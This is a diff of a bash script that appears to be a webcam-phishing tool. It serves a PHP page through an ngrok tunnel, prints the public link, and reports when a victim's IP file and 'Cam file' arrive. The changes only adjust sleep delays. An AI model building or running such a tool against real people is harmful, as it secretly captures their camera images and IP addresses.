@@ -63,13 +63,13 @@ rm -rf ip.txt
 
 fi
 
-sleep 0.3
+sleep 0.5
 
 if [[ -e "Log.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
 rm -rf Log.log
 fi
-sleep 0.3
+sleep 0.5
 
 done
 
@@ -155,7 +155,7 @@ php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
-sleep 8
+sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
@@ -184,7 +184,7 @@ elif [[ $option_server -eq 2 ]]; then
 ngrok_server
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
-sleep 0.3
+sleep 1
 clear
 start1
 fi
